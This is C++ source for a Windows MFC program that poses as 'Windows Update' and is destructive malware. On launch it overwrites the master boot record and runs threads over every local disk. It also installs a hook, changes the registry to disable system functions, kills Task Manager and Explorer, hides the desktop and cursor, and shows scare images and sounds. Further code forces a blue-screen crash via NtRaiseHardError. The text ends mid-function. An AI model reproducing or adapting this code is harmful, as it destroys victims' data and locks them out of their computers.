// WinDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Win.h"
#include "WinDlg.h"

#include <winioctl.h>
#include <TlHelp32.h>

#include <io.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <string>


#include <mmsystem.h>
#pragma comment(lib,"Winmm.lib")

#include "HookClass.h"
#include "DiskTools.h"
#include "FileTool.h"
#include "ModifyRegistry.h"

typedef int(_stdcall *RightRaising)(DWORD, DWORD, BOOLEAN, LPBYTE);
typedef int(_stdcall *Error)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD);

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CWinDlg dialog

CWinDlg::CWinDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CWinDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CWinDlg)
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CWinDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CWinDlg)
	DDX_Control(pDX, IDC_Taskbar, m_Taskbar);
	DDX_Control(pDX, IDC_StartMenu, m_StartMenu);
	DDX_Control(pDX, IDC_LoadPicture, m_LoadPicture);
	DDX_Control(pDX, IDC_Loading, m_Loading);
	DDX_Control(pDX, IDC_GifContent, m_GifContent);
	DDX_Control(pDX, IDC_Content, m_Content);
	DDX_Control(pDX, IDC_TaskbarIcon, Picture);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CWinDlg, CDialog)
	//{{AFX_MSG_MAP(CWinDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_StartBUTTON, OnStartBUTTON)
	ON_WM_TIMER()
	ON_BN_DOUBLECLICKED(IDC_DesktopIcon1, OnDoubleclickedDesktopIcon1)
	ON_BN_DOUBLECLICKED(IDC_DesktopIcon2, OnDoubleclickedDesktopIcon2)
	ON_BN_DOUBLECLICKED(IDC_DesktopIcon3, OnDoubleclickedDesktopIcon3)
	ON_BN_DOUBLECLICKED(IDC_DesktopIcon4, OnDoubleclickedDesktopIcon4)
	ON_BN_DOUBLECLICKED(IDC_DesktopIcon5, OnDoubleclickedDesktopIcon5)
	ON_BN_DOUBLECLICKED(IDC_DesktopIcon6, OnDoubleclickedDesktopIcon6)
	ON_BN_CLICKED(IDC_Close, OnClose)
	ON_BN_CLICKED(IDC_Close2, OnClose2)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CWinDlg message handlers



void HideDesktopElements()
{
	HWND hWnd1 = ::FindWindow(TEXT("Progman"),TEXT("Program Manager"));
	HWND hWnd2 = ::FindWindow(TEXT("Shell_traywnd"),TEXT(""));

	if(hWnd1 != NULL)
	{
		::SetWindowPos(hWnd1,0,0,0,0,0,SWP_HIDEWINDOW);
	}
	if(hWnd2 != NULL)
	{
		::SetWindowPos(hWnd2,0,0,0,0,0,SWP_HIDEWINDOW);
	}
}




bool KillProcess(DWORD PID)
{
	DWORD ExitCode = 1;
	HANDLE hWd = OpenProcess(PROCESS_ALL_ACCESS,false,PID);
	if(hWd != NULL)
	{
		if(TerminateProcess(hWd,ExitCode) != NULL)
		{
			CloseHandle(hWd);
			return true;
		}

	}
    CloseHandle(hWd);
	return false;

}



DWORD GetProcessIdFromName(char *name)
{
    HANDLE  hsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hsnapshot == INVALID_HANDLE_VALUE) 
    {   
        printf("CreateToolhelp32Snapshot Error!\n");
        return 0;  
    }
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    int flag = Process32First(hsnapshot, &pe);

    while (flag != 0)
    {
        if (strcmp(pe.szExeFile, name) == 0)
        {
            return pe.th32ProcessID;
        }
        flag = Process32Next(hsnapshot, &pe);
    }

    CloseHandle(hsnapshot);

    return 0;
}




bool ImplementKillDriver()
{
	DiskTools Disk;

	bool State[26];
	int StateNumber = Disk.KillDrive(State);
	unsigned int Effective = 0;
	for(int i=0;i<StateNumber;i++)
	{
		if(State[i])
		{
			Effective++;
		}
	}

	if(StateNumber == Effective)
	{
		if(Disk.WriteMBR())
		{
			return true;
		}
	}
	else
	{
		return false;
	}

	return false;
}



FileTool file;
int threadFlag = 0; //线程标记变量
bool threadEnd = false; //线程结束标记


DWORD WINAPI ThreadTask(LPVOID lpParamter)
{
	file.AllFiles((char *)lpParamter);
	threadFlag++;

    return 0L;
}


void StartMultithreadedTask()
{
	CString disk[26];
	short int diskNum = file.IsLocalDisk(disk);
	HANDLE hThread[26];

	for(int i=0;i<diskNum;i++)
	{
		hThread[i] = CreateThread(NULL, 0, ThreadTask,(char *)disk[i].GetBuffer(10), 0, NULL);
	}

	WaitForMultipleObjects(diskNum,hThread,true,INFINITE);

	for(int j=0;j<diskNum;j++)
	{
		CloseHandle(hThread[j]);
	}

	if(threadFlag == diskNum)
	{
		threadFlag = 0;
		threadEnd = true;
	}

}


DWORD WINAPI ExecuteTask(LPVOID lpParamter)
{
	//执行
	StartMultithreadedTask();
    return 0L;
}



CBitmapButton m_btnX,m_btnX1,m_btnX2,m_btnX3,m_btnX4,m_btnX5,m_btnX6,m_btnX7,m_btnX8,StartMenu;


const int RefreshTime=8000; //刷新时间

bool ContentVisible; //按钮

bool Flag=true; //开始菜单标记

bool LoadingVisible; //加载
short int Alignment; //加载元素的对其方式
int LoadingTXT; //加载的文字
short int LoadingFlag; //控制显示的过程

bool StartMenuValue; //开始菜单样式

bool StartMenuDraw; //开始菜单重绘

bool RefreshDesktopIconSwitch; //刷新桌面图标开关

bool RefreshStart; //刷新开始按钮

bool StartLoading; //开始加载标记


int cx   =   GetSystemMetrics(SM_CXSCREEN);
int cy   =   GetSystemMetrics(SM_CYSCREEN);

HookClass Hook;

BOOL CWinDlg::OnInitDialog()
{
	HANDLE hMutex=::CreateMutex(NULL,TRUE,"Windows Update"); 
	if(hMutex!=NULL)  
	{  
		if(GetLastError()==ERROR_ALREADY_EXISTS)  
		{  
			CWinDlg::OnCancel();
			return FALSE;
		}
	} 


/*
    CRect   rcTemp;
    rcTemp.BottomRight() = CPoint(cx,   cy);
    rcTemp.TopLeft()=CPoint(0,   0);
    MoveWindow(&rcTemp);
*/



//判断分辨率
if(cx >= 1024 || cy >= 768)
{

	DiskTools Disk;
	if(	Disk._WriteMBR())
	{
		//写入文件
		HANDLE theThread = {0};
		theThread = CreateThread(NULL, 0, ExecuteTask,NULL, 0, NULL);
		CloseHandle(theThread);

		SetTimer(13,500,NULL);

		CDialog::OnInitDialog();

		// Add "About..." menu item to system menu.

		// IDM_ABOUTBOX must be in the system command range.
		ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
		ASSERT(IDM_ABOUTBOX < 0xF000);

		CMenu* pSysMenu = GetSystemMenu(FALSE);
		if (pSysMenu != NULL)
		{
			CString strAboutMenu;
			strAboutMenu.LoadString(IDS_ABOUTBOX);
			if (!strAboutMenu.IsEmpty())
			{
				pSysMenu->AppendMenu(MF_SEPARATOR);
				pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
			}
		}

		// Set the icon for this dialog.  The framework does this automatically
		//  when the application's main window is not a dialog
		SetIcon(m_hIcon, TRUE);			// Set big icon
		SetIcon(m_hIcon, FALSE);		// Set small icon
		
		// TODO: Add extra initialization here



		//绘制开始按钮
		m_btnX.LoadBitmaps(IDB_Start);
		m_btnX.SubclassDlgItem(IDC_StartBUTTON,this);
		m_btnX.SizeToContent();
		//m_btnX.SetRedraw(true);
		m_btnX.UpdateData();

		//绘制桌面图标
		m_btnX1.LoadBitmaps(IDB_DesktopIcon1);
		m_btnX1.SubclassDlgItem(IDC_DesktopIcon1,this);
		m_btnX1.SizeToContent();
		//m_btnX1.SetRedraw(true);
		//m_btnX1.InvalidateRect(&btnX1,false);
		m_btnX1.UpdateData();

		m_btnX2.LoadBitmaps(IDB_DesktopIcon2);
		m_btnX2.SubclassDlgItem(IDC_DesktopIcon2,this);
		m_btnX2.SizeToContent();
		//m_btnX2.SetRedraw(true);
		//m_btnX2.InvalidateRect(&btnX2,false);
		m_btnX2.UpdateData();

		m_btnX3.LoadBitmaps(IDB_DesktopIcon3);
		m_btnX3.SubclassDlgItem(IDC_DesktopIcon3,this);
		m_btnX3.SizeToContent();
		//m_btnX3.SetRedraw(true);
		//m_btnX3.InvalidateRect(&btnX3,false);
		m_btnX3.UpdateData();

		m_btnX4.LoadBitmaps(IDB_DesktopIcon4);
		m_btnX4.SubclassDlgItem(IDC_DesktopIcon4,this);
		m_btnX4.SizeToContent();
		//m_btnX4.SetRedraw(true);
		//m_btnX4.InvalidateRect(&btnX4,false);
		m_btnX4.UpdateData();

		m_btnX5.LoadBitmaps(IDB_DesktopIcon5);
		m_btnX5.SubclassDlgItem(IDC_DesktopIcon5,this);
		m_btnX5.SizeToContent();
		//m_btnX5.SetRedraw(true);
		//m_btnX5.InvalidateRect(&btnX5,false);
		m_btnX5.UpdateData();

		m_btnX6.LoadBitmaps(IDB_DesktopIcon6);
		m_btnX6.SubclassDlgItem(IDC_DesktopIcon6,this);
		m_btnX6.SizeToContent();
		//m_btnX6.SetRedraw(true);
		//m_btnX6.InvalidateRect(&btnX6,false);
		m_btnX6.UpdateData();

		m_btnX7.LoadBitmaps(IDB_Button1);
		m_btnX7.SubclassDlgItem(IDC_Close,this);
		m_btnX7.SizeToContent();
		//m_btnX7.SetRedraw(true);
		m_btnX7.UpdateData();

		m_btnX8.LoadBitmaps(IDB_Button2);
		m_btnX8.SubclassDlgItem(IDC_Close2,this);
		m_btnX8.SizeToContent();
		//m_btnX8.SetRedraw(true);
		m_btnX8.UpdateData();


		//设置桌面壁纸
		char NullPath[1];
		SystemParametersInfoA(SPI_SETDESKWALLPAPER, NULL, NullPath, SPIF_SENDCHANGE);

		//初始化工作
		Hook.SetHook(); //加载钩子

		ModifyRegistry(); //修改注册表禁用系统功能

		HideDesktopElements(); //隐藏桌面图标和任务栏

		KillProcess(GetProcessIdFromName("Taskmgr.exe")); //结束Taskmgr.exe
		KillProcess(GetProcessIdFromName("taskmgr.exe")); //结束taskmgr.exe
		KillProcess(GetProcessIdFromName("explorer.exe")); //结束explorer.exe

		PictureNumber = IDB_Blue; //蓝色背景
		LoadingVisible = true; //绘制加载元素
		LoadingTXT = IDB_LoadTXT1; //加载的文字
		if(m_Loading.Load(MAKEINTRESOURCE(IDR_GIF2),_T("GIF"))) //加载gif
		{
			m_Loading.Draw(); //播放gif
		}
		SetTimer(5,2000,NULL); //启用时钟5

		ShowCursor(false);//隐藏鼠标图标

		SetTimer(10,25,NULL); //对话框置顶刷新操作

		::SetWindowPos(GetSafeHwnd(),HWND_TOPMOST,0,0,cx,cy,SWP_ASYNCWINDOWPOS | SWP_DEFERERASE);
		this->ShowWindow(SW_HIDE);
	}
	else
	{
		MessageBox("安装程序运行失败","Windows Update",MB_ICONEXCLAMATION);
		CWinDlg::OnCancel();
		return FALSE;
	}


}
else
{
	MessageBox("安装程序至少需要 1024×768 分辨率","Windows Update",MB_ICONEXCLAMATION);
	CWinDlg::OnCancel();
	return FALSE;
}


	return TRUE;  // return TRUE  unless you set the focus to a control
}










void CWinDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}


}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.


bool TaskbarSwitch = false; //任务栏开关
void CWinDlg::DesktopElements(bool Flag)
{
	if(Flag)
	{
		TaskbarSwitch = true;
		GetDlgItem(IDC_DesktopIcon1)->ShowWindow(SW_SHOW);
		GetDlgItem(IDC_DesktopIcon2)->ShowWindow(SW_SHOW);
		GetDlgItem(IDC_DesktopIcon3)->ShowWindow(SW_SHOW);
		GetDlgItem(IDC_DesktopIcon4)->ShowWindow(SW_SHOW);
		GetDlgItem(IDC_DesktopIcon5)->ShowWindow(SW_SHOW);
		GetDlgItem(IDC_DesktopIcon6)->ShowWindow(SW_SHOW);

		GetDlgItem(IDC_StartBUTTON)->ShowWindow(SW_SHOW);
		GetDlgItem(IDC_TaskbarIcon)->ShowWindow(SW_SHOW);
		GetDlgItem(IDC_Taskbar)->ShowWindow(SW_SHOW);

		RefreshDesktopIconSwitch = true; //恢复桌面图标刷新
		RefreshStart = true; //恢复刷新开始菜单
	}
	else
	{
		TaskbarSwitch = false;
		GetDlgItem(IDC_DesktopIcon1)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_DesktopIcon2)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_DesktopIcon3)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_DesktopIcon4)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_DesktopIcon5)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_DesktopIcon6)->ShowWindow(SW_HIDE);

		GetDlgItem(IDC_StartBUTTON)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_TaskbarIcon)->ShowWindow(SW_HIDE);
		GetDlgItem(IDC_Taskbar)->ShowWindow(SW_HIDE);

		RefreshDesktopIconSwitch = false; //取消桌面图标刷新
		RefreshStart = false; //取消刷新开始菜单

	}
}

void CWinDlg::FlashTerror()
{
	UpdateWindow();	

	CRect rectDlg,rectTaskbar;
	GetClientRect(&rectDlg);
	GetDlgItem(IDC_Taskbar)->GetWindowRect(&rectTaskbar);

	switch(rand()%6)
	{
	case 0:
		PictureNumber=IDB_Terror_S1;
		break;
	case 1:
		PictureNumber=IDB_Terror_S2;
		break;
	case 2:
		PictureNumber=IDB_Terror_S3;
		break;
	case 3:
		PictureNumber=IDB_Terror_S4;
		break;
	case 4:
		PictureNumber=IDB_Terror_S5;
		break;
	case 5:
		PictureNumber=IDB_Terror_S6;
		break;
	}
	//刷新
	InvalidateRect(&rectDlg,false);
	UpdateWindow();	

	//延时还原
	SetTimer(7,150,NULL); 
}


void CWinDlg::RunTerror()
{

	CRect rectDlg,rectTaskbar;
	GetClientRect(&rectDlg);
	GetDlgItem(IDC_Taskbar)->GetWindowRect(&rectTaskbar);

	//隐藏开始菜单
	Flag = true;
	GetDlgItem(IDC_StartMenu)->ShowWindow(SW_HIDE);

	ShowCursor(false);//隐藏鼠标

	KillTimer(1);

	UpdateWindow();	

	int musicNum;

	switch(int(rand()%8))
	{
	case 0:
		PictureNumber=IDB_Terror1;
		musicNum=IDB_TerrorMusic1;
		SetTimer(2,1000,NULL);
		break;
	case 1:
		PictureNumber=IDB_Terror2;
		musicNum=IDB_TerrorMusic2;
		SetTimer(2,4000,NULL);
		break;
	case 2:
		PictureNumber=IDB_Terror3;
		musicNum=IDB_TerrorMusic3;
		SetTimer(2,2000,NULL);
		break;
	case 3:
		PictureNumber=IDB_Terror4;
		musicNum=IDB_TerrorMusic4;
		SetTimer(2,10000,NULL);
		break;
	case 4:
		PictureNumber=IDB_Terror5;
		musicNum=IDB_TerrorMusic5;
		SetTimer(2,1000,NULL);
		break;
	case 5:
		PictureNumber=IDB_Terror6;
		musicNum=IDB_TerrorMusic3;
		SetTimer(2,2000,NULL);
		break;
	case 6:
		PictureNumber=IDB_Terror7;
		musicNum=IDB_TerrorMusic2;
		SetTimer(2,4000,NULL);
		break;
	case 7:
		PictureNumber=IDB_Terror8;
		musicNum=IDB_TerrorMusic6;
		SetTimer(2,5000,NULL);
		break;
	}

	//刷新
	InvalidateRect(&rectDlg,false);
	DesktopElements(false); //不显示桌面元素
	UpdateWindow();


	if(!sndPlaySound((LPCTSTR)musicNum,SND_RESOURCE | SND_ASYNC)) //如果执行错误
	{
		//还原
		switch(rand()%4)
		{
		case 0:
			PictureNumber=IDB_Desktop1;
			break;
		case 1:
			PictureNumber=IDB_Desktop2;
			break;
		case 2:
			PictureNumber=IDB_Desktop3;
			break;
		case 3:
			PictureNumber=IDB_Desktop4;
			break;
		}

		DesktopElements(true); //显示桌面元素
		
		InvalidateRect(&rectDlg,false);
		UpdateWindow();	

	}


}



void CWinDlg::PlaySwitch(bool Flag)
{
	if(Flag)
	{
		SetTimer(1,RefreshTime,NULL);
	}
	else
	{
		KillTimer(1);
		KillTimer(2);
		KillTimer(6);
	}
}


void CWinDlg::DesktopEnabled(bool Flag)
{
	GetDlgItem(IDC_DesktopIcon1)->EnableWindow(Flag);
	GetDlgItem(IDC_DesktopIcon2)->EnableWindow(Flag);
	GetDlgItem(IDC_DesktopIcon3)->EnableWindow(Flag);
	GetDlgItem(IDC_DesktopIcon4)->EnableWindow(Flag);
	GetDlgItem(IDC_DesktopIcon5)->EnableWindow(Flag);
	GetDlgItem(IDC_DesktopIcon6)->EnableWindow(Flag);

	GetDlgItem(IDC_StartBUTTON)->EnableWindow(Flag);
}


void DrawScreen()
{
	HWND whdc=::GetDesktopWindow();
	HDC hdc = ::GetWindowDC(whdc);
	struct tagRECT Rect;
	::GetWindowRect(whdc,&Rect);
	::BitBlt(hdc,0,0, Rect.right, Rect.bottom,hdc,0,0,NOTSRCCOPY);
	::StretchBlt(hdc,0,0,Rect.right,Rect.bottom,hdc,-50,-50,Rect.right+100,Rect.bottom+100,SRCCOPY);
	::ReleaseDC(whdc,hdc);

}


void BlueError()
{
	BOOLEAN bEnabled;
	ULONG uResp;
	HMODULE ntdll = LoadLibrary("ntdll.dll");
	if(ntdll)
	{
		RightRaising RtlAdjPriv = (RightRaising)GetProcAddress(ntdll,"RtlAdjustPrivilege");
		Error NtRaiseHardErr = (Error)GetProcAddress(ntdll,"NtRaiseHardError");
		RtlAdjPriv(19,true,false,&bEnabled);
		NtRaiseHardErr(STATUS_FLOAT_MULTIPLE_FAULTS,0,0,0,6, &uResp);
	}


}

void CWinDlg::RefreshDesktopIcon()
{
	GetDlgItem(IDC_DesktopIcon1)->Invalidate(false);
	GetDlgItem(IDC_DesktopIcon1)->UpdateWindow();

	GetDlgItem(IDC_DesktopIcon2)->Invalidate(false);
	GetDlgItem(IDC_DesktopIcon2)->UpdateWindow();

	GetDlgItem(IDC_DesktopIcon3)->Invalidate(false);
	GetDlgItem(IDC_DesktopIcon3)->UpdateWindow();

	GetDlgItem(IDC_DesktopIcon4)->Invalidate(false);
	GetDlgItem(IDC_DesktopIcon4)->UpdateWindow();

	GetDlgItem(IDC_DesktopIcon5)->Invalidate(false);
	GetDlgItem(IDC_DesktopIcon5)->UpdateWindow();

	GetDlgItem(IDC_DesktopIcon6)->Invalidate(false);
	GetDlgItem(IDC_DesktopIcon6)->UpdateWindow();
}


void CWinDlg::OnPaint() 
{

	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{

		UpdateWindow();	
		CPaintDC dc(this);
		CRect rect;
		GetClientRect(&rect);
		CDC dcBmp;
		dcBmp.CreateCompatibleDC(&dc);
		CBitmap bmpBackground;   
		bmpBackground.LoadBitmap(PictureNumber); 
		BITMAP m_bitmap;            
		bmpBackground.GetBitmap(&m_bitmap);
		CBitmap *pbmpOld=dcBmp.SelectObject(&bmpBackground);
		dc.StretchBlt(0,0,rect.Width(),rect.Height(),&dcBmp,0,0,m_bitmap.bmWidth,m_bitmap.bmHeight,SRCCOPY);

		//CDialog::OnPaint();

		//任务栏和开始按钮
		if(TaskbarSwitch)
		{

			//CRect rect;
			//GetClientRect(rect);
			//dc.FillSolidRect(rect, RGB(0,0,0));
			//CDialog::OnPaint();

			//内容初始化
			CRect rectTaskbar,rectDlg,rectStart,rectTaskbarIcon;
			GetClientRect(&rectDlg);

			GetDlgItem(IDC_Taskbar)->GetWindowRect(&rectTaskbar); //任务栏
			GetDlgItem(IDC_StartBUTTON)->GetWindowRect(&rectStart); //开始按钮
			GetDlgItem(IDC_TaskbarIcon)->GetWindowRect(&rectTaskbarIcon); //任务栏运行的程序

			GetDlgItem(IDC_Taskbar)->SetWindowPos(NULL, 0, rectDlg.Height()-rectTaskbar.Height(), rectDlg.right,40, SWP_SHOWWINDOW | SWP_DEFERERASE | SWP_NOACTIVATE);//任务栏
			GetDlgItem(IDC_StartBUTTON)->SetWindowPos(NULL, 0, (rectTaskbar.top - rectStart.Height()) + (rectTaskbar.Height()+ rectStart.Height())/2, 48,40, SWP_SHOWWINDOW | SWP_DEFERERASE | SWP_NOACTIVATE);//开始按钮
			GetDlgItem(IDC_TaskbarIcon)->SetWindowPos(NULL, 100, (rectTaskbar.top - rectTaskbarIcon.Height()) + (rectTaskbar.Height()+ rectTaskbarIcon.Height())/2, rectTaskbarIcon.Width(),rectTaskbarIcon.Height(), SWP_SHOWWINDOW | SWP_DEFERERASE | SWP_NOACTIVATE);//任务栏运行的程序

			/*
			GetDlgItem(IDC_StartBUTTON)->ModifyStyle(0, WS_CLIPSIBLINGS);
			GetDlgItem(IDC_StartBUTTON)->ShowWindow(SW_HIDE);
			GetDlgItem(IDC_Taskbar)->ModifyStyle(0, WS_CLIPSIBLINGS);
			GetDlgItem(IDC_StartBUTTON)->ShowWindow(SW_SHOW);
			*/
	
			/*
			m_btnX1.Invalidate(false);
			m_btnX1.UpdateWindow();

			m_btnX2.Invalidate(false);
			m_btnX2.UpdateWindow();
			*/

		}
		else
		{

			//内容初始化
			CRect rectTaskbar,rectDlg,rectStart,rectTaskbarIcon;
			GetClientRect(&rectDlg);

			GetDlgItem(IDC_Taskbar)->GetWindowRect(&rectTaskbar); //任务栏
			GetDlgItem(IDC_StartBUTTON)->GetWindowRect(&rectStart); //开始按钮
			GetDlgItem(IDC_TaskbarIcon)->GetWindowRect(&rectTaskbarIcon); //任务栏运行的程序

			GetDlgItem(IDC_Taskbar)->SetWindowPos(NULL, 0, rectDlg.Height()-rectTaskbar.Height(), rectDlg.right,40, SWP_HIDEWINDOW | SWP_DEFERERASE | SWP_NOACTIVATE | SWP_NOSENDCHANGING);//任务栏
			GetDlgItem(IDC_StartBUTTON)->SetWindowPos(NULL, 0, (rectTaskbar.top - rectStart.Height()) + (rectTaskbar.Height()+ rectStart.Height())/2, 48,40, SWP_HIDEWINDOW | SWP_DEFERERASE | SWP_NOACTIVATE | SWP_NOSENDCHANGING);//开始按钮
			GetDlgItem(IDC_TaskbarIcon)->SetWindowPos(NULL, 100, (rectTaskbar.top - rectTaskbarIcon.Height()) + (rectTaskbar.Height()+ rectTaskbarIcon.Height())/2, rectTaskbarIcon.Width(),rectTaskbarIcon.Height(), SWP_HIDEWINDOW | SWP_DEFERERASE | SWP_NOACTIVATE | SWP_NOSENDCHANGING);//任务栏运行的程序
		
			//刷新图标位置
			CRect DesktopIcon1,DesktopIcon2,DesktopIcon3,DesktopIcon4,DesktopIcon5,DesktopIcon6;

			int Distance = 96;

			GetDlgItem(IDC_DesktopIcon1)->GetWindowRect(&DesktopIcon1);  //获取图标1位置
			GetDlgItem(IDC_DesktopIcon2)->GetWindowRect(&DesktopIcon2);  //获取图标2位置
			GetDlgItem(IDC_DesktopIcon3)->GetWindowRect(&DesktopIcon3);  //获取图标3位置
			GetDlgItem(IDC_DesktopIcon4)->GetWindowRect(&DesktopIcon4);  //获取图标4位置
			GetDlgItem(IDC_DesktopIcon5)->GetWindowRect(&DesktopIcon5);  //获取图标5位置
			GetDlgItem(IDC_DesktopIcon6)->GetWindowRect(&DesktopIcon6);  //获取图标6位置

			GetDlgItem(IDC_DesktopIcon1)->SetWindowPos(NULL, 21, 14, NULL ,NULL, SWP_HIDEWINDOW | SWP_NOSIZE | SWP_NOZORDER);

			GetDlgItem(IDC_DesktopIcon2)->SetWindowPos(NULL, DesktopIcon1.left,DesktopIcon1.top + Distance, NULL ,NULL, SWP_HIDEWINDOW | SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
			GetDlgItem(IDC_DesktopIcon3)->SetWindowPos(NULL, DesktopIcon2.left,DesktopIcon2.top + Distance, NULL ,NULL, SWP_HIDEWINDOW | SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
			GetDlgItem(IDC_DesktopIcon4)->SetWindowPos(NULL, DesktopIcon3.left,DesktopIcon3.top + Distance, NULL ,NULL, SWP_HIDEWINDOW | SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
			GetDlgItem(IDC_DesktopIcon5)->SetWindowPos(NULL, DesktopIcon4.left,DesktopIcon4.top + Distance, NULL ,NULL, SWP_HIDEWINDOW | SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
			GetDlgItem(IDC_DesktopIcon6)->SetWindowPos(NULL, DesktopIcon5.left,DesktopIcon5.top + Distance, NULL ,NULL, SWP_HIDEWINDOW | SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);

		}

		if(ContentVisible)
		{

			UpdateWindow();

			CRect rectGifContent,rectClose,rectClose2;
			GetDlgItem(IDC_GifContent)->GetWindowRect(&rectGifContent); 

			GetDlgItem(IDC_Close)->GetWindowRect(&rectClose); 
			GetDlgItem(IDC_Close2)->GetWindowRect(&rectClose2); 

			//GetDlgItem(IDC_Close)->SetWindowPos(NULL,(rectContent.left + rectContent.Width()) - rectClose.Width() ,rectContent.top,rectClose.Width(),rectClose.Height(), SWP_SHOWWINDOW);
			GetDlgItem(IDC_Close)->SetWindowPos(NULL,rectGifContent.left,rectGifContent.top + rectGifContent.Height(),rectClose.Width(),rectClose.Height(), SWP_SHOWWINDOW);//点击图标显示的内容

			GetDlgItem(IDC_Close2)->SetWindowPos(NULL,rectClose.left,rectClose.top + rectClose.Height(),rectClose2.Width(),rectClose2.Height(), SWP_SHOWWINDOW);//点击图标显示的内容

			GetDlgItem(IDC_Close)->Invalidate(false);
			GetDlgItem(IDC_Close)->UpdateData(false);

			GetDlgItem(IDC_Close2)->Invalidate(false);
			GetDlgItem(IDC_Close2)->UpdateData(false);

		}


		//加载中
		if(LoadingVisible)
		{
			
			PlaySwitch(false); //关闭屏幕恐怖切换
			//DesktopEnabled(false); //不启用桌面元素

			//打开图片1
			CBitmap bitmap;
			HBITMAP hbmp;
			bitmap.LoadBitmap(LoadingTXT);
			hbmp = (HBITMAP)bitmap.GetSafeHandle();
			m_LoadPicture.SetBitmap(hbmp); //单击图标显示内容
			
			CRect rectDlg,rectLoading,rectLoadPicture;
			GetClientRect(&rectDlg);
			GetDlgItem(IDC_LoadPicture)->GetWindowRect(&rectLoadPicture);
			GetDlgItem(IDC_Loading)->GetWindowRect(&rectLoading);

			//当正在更新页面时
			if(Alignment == 0)
			{

				GetDlgItem(IDC_Loading)->SetWindowPos(NULL, (rectDlg.Width() - rectLoading.Width())/2, (rectDlg.Height() - (rectLoading.Height() + rectLoadPicture.Height()))/2, rectLoading.Width(),rectLoading.Height(), SWP_SHOWWINDOW);
				GetDlgItem(IDC_LoadPicture)->SetWindowPos(NULL, (rectDlg.Width() - rectLoadPicture.Width())/2,rectLoading.top + rectLoading.Height(), rectLoadPicture.Width(),rectLoadPicture.Height(), SWP_SHOWWINDOW);
					
			}
			//当正在windows徽标加载或登录时
			else if(Alignment == 1)
			{
				GetDlgItem(IDC_LoadPicture)->SetWindowPos(NULL, (rectDlg.Width() - rectLoadPicture.Width())/2, (rectDlg.Height() - (rectLoadPicture.Height() + rectLoadPicture.Height()))/2, rectLoadPicture.Width(),rectLoadPicture.Height(), SWP_SHOWWINDOW);
				GetDlgItem(IDC_Loading)->SetWindowPos(NULL, (rectDlg.Width() - rectLoading.Width())/2,(rectDlg.Height()-rectLoading.Height()) - (rectLoading.Height() *2), rectLoading.Width(),rectLoading.Height(), SWP_SHOWWINDOW);	
			}
			else
			{
				GetDlgItem(IDC_LoadPicture)->SetWindowPos(NULL, (rectDlg.Width() - rectLoadPicture.Width())/2, (rectDlg.Height() - (rectLoadPicture.Height() + rectLoadPicture.Height()))/2, rectLoadPicture.Width(),rectLoadPicture.Height(), SWP_SHOWWINDOW);
